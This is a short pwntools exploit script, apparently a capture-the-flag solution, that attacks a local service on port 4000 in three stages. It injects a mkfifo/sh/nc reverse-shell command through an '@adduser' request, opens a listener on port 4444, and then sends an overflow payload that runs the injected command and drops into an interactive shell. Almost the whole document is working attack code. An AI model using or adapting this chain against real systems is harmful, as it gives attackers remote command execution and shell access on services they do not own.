#!/usr/bin/python
from pwn import *

print "[*] 1st stage... add script code"
raw_input()
r = remote("127.0.0.1",4000)
payload = "@adduser mkfifo /tmp/a; sh < /tmp/a | nc 127.0.0.1 4444 > /tmp/a; blablabla"
r.sendline(payload)
r.close()

print ""
print ""
print "[*] 2nd stage... opening port"
raw_input()
l = listen(4444)

print ""
print ""
print "[*] 3nd stage... trigger bug!"
raw_input()
r = remote("127.0.0.1", 4000)

payload  = ""
payload += "@adduser " 
payload += "h -c ./OnionUser.db "
payload += "A"*(120-19) 
payload += ";;;\x01" 

r.sendline(payload)

# r.interactive()
l.interactive()
